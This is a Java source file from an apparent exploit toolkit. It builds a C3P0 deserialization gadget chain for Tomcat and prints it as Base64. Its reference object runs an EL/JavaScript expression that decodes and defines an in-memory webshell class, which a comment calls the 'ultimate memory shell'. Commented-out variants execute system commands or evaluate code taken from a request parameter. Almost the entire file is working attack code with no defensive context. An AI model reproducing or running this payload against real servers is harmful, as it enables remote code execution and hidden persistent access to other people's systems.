package gadget;

import com.fasterxml.jackson.databind.ser.Serializers;
import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;
import util.ReflectionUtils;
import util.SerializerUtils;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.Base64;
import java.util.logging.Logger;
//C3P0不出网利用
public class C3P0Tomcat {

    static String memshell = "";
    public static void main(String[] args) throws Exception {
        C3P0Tomcat c3P0 = new C3P0Tomcat();
        Object object = c3P0.getObject();

        System.out.println(Base64.getEncoder().encodeToString(SerializerUtils.serialize(object)));

//        unserialize();
    }
    public Object getObject () throws Exception {
        PoolBackedDataSource b=new PoolBackedDataSource();
        ReflectionUtils.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource("org.apache.naming.factory.BeanFactory", null));
        return b;
    }
    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;
        private String url;

        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        @Override
        public Reference getReference() {
            //究极内存马
            String expression="''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('var classLoader = java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass(\\'Injext\\').newInstance();}catch (e){var clsString = classLoader.loadClass(\\'java.lang.String\\');var bytecodeBase64 = \\'"+memshell+"\\';var bytecode;try{var clsBase64 = classLoader.loadClass(\\'java.util.Base64\\');var clsDecoder = classLoader.loadClass(\\'java.util.Base64$Decoder\\');var decoder = clsBase64.getMethod(\\'getDecoder\\').invoke(base64Clz);bytecode = clsDecoder.getMethod(\\'decode\\', clsString).invoke(decoder, bytecodeBase64);} catch (ee) {try {var datatypeConverterClz = classLoader.loadClass(\\'javax.xml.bind.DatatypeConverter\\');bytecode = datatypeConverterClz.getMethod(\\'parseBase64Binary\\', clsString).invoke(datatypeConverterClz, bytecodeBase64);} catch (eee) {var clazz1 = classLoader.loadClass(\\'sun.misc.BASE64Decoder\\');bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);}}var clsClassLoader = classLoader.loadClass(\\'java.lang.ClassLoader\\');var clsByteArray = (new java.lang.String(\\'a\\').getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(\\'defineClass\\', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();}')";
            expression="''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('var classLoader = java.lang.Thread.currentThread().getContextClassLoader();var clsString = classLoader.loadClass(\\'java.lang.String\\');var bytecodeBase64 = \\'"+memshell+"\\';var bytecode;try{var clsBase64 = classLoader.loadClass(\\'java.util.Base64\\');var clsDecoder = classLoader.loadClass(\\'java.util.Base64.Decoder\\');var decoder = clsBase64.getMethod(\\'getDecoder\\').invoke(base64Clz);bytecode = clsDecoder.getMethod(\\'decode\\', clsString).invoke(decoder, bytecodeBase64);} catch (ee) {try {var datatypeConverterClz = classLoader.loadClass(\\'javax.xml.bind.DatatypeConverter\\');bytecode = datatypeConverterClz.getMethod(\\'parseBase64Binary\\', clsString).invoke(datatypeConverterClz, bytecodeBase64);} catch (eee) {var clazz1 = classLoader.loadClass(\\'sun.misc.BASE64Decoder\\');bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);}}var clsClassLoader = classLoader.loadClass(\\'java.lang.ClassLoader\\');var clsByteArray = (new java.lang.String(\\'a\\').getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(\\'defineClass\\', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();')";
            expression="''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('var classLoader = java.lang.Thread.currentThread().getContextClassLoader();var clsString = classLoader.loadClass(\\'java.lang.String\\');var bytecodeBase64 = \\'"+memshell+"\\';var bytecode;var clsBase64 = classLoader.loadClass(\\'java.util.Base64\\');var base64c= clsBase64.getDeclaredConstructor();base64c.setAccessible(true);var base64i = base64c.newInstance();var decoder = clsBase64.getDeclaredMethod(\\'getDecoder\\').invoke(base64i);bytecode = decoder.getClass().getMethod(\\'decode\\', clsString).invoke(decoder, bytecodeBase64);var clsClassLoader = classLoader.loadClass(\\'java.lang.ClassLoader\\');var clsByteArray = (new java.lang.String(\\'a\\').getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(\\'defineClass\\', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();')";
            expression="''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('var classLoader = java.lang.Thread.currentThread().getContextClassLoader();var clsString = classLoader.loadClass(\\'java.lang.String\\');var bytecodeBase64 = \\'"+memshell+"\\';var bytecode;var clsBase64 = classLoader.loadClass(\\'java.util.Base64\\');var base64c= clsBase64.getDeclaredConstructor();base64c.setAccessible(true);var base64i = base64c.newInstance();var decoder = clsBase64.getDeclaredMethod(\\'getDecoder\\').invoke(base64i);bytecode = decoder.getClass().getMethod(\\'decode\\', clsString).invoke(decoder, bytecodeBase64);var clsClassLoader = classLoader.loadClass(\\'java.lang.ClassLoader\\');var clsByteArray = bytecode.getClass();var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(\\'defineClass\\', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();')";
            expression="''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('var classLoader = java.lang.Thread.currentThread().getContextClassLoader();var bytecodeBase64 = \\'"+memshell+"\\';var bytecode=java.util.Base64.getDecoder().decode(bytecodeBase64);var clsClassLoader = classLoader.loadClass(\\'java.lang.ClassLoader\\');var clsByteArray = bytecode.getClass();var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(\\'defineClass\\', clsByteArray, clsInt, clsInt);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();')";
            //            String expression = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"var s = [3];s[0] = \\\"cmd\\\";s[1] = \\\"/c\\\";s[2] = \\\"calc\\\";var p = java.lang.Runtime.getRuntime().exec(s);var sc = new java.util.Scanner(p.getInputStream(),\\\"GBK\\\").useDelimiter(\\\"\\\\\\\\A\\\");var result = sc.hasNext() ? sc.next() : \\\"\\\";sc.close();result;\")";
//            String elcode = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(pageContext.request.getParameter(\"ant\"))";
            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
            resourceRef.add(new StringRefAddr("forceString", "x=eval"));
            resourceRef.add(new StringRefAddr("x", expression));
            return resourceRef;
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("C3P0.bin"));
        objectOutputStream.writeObject(obj);
    }

    public static void unserialize() throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("C3P0.bin"));
        objectInputStream.readObject();
    }
}
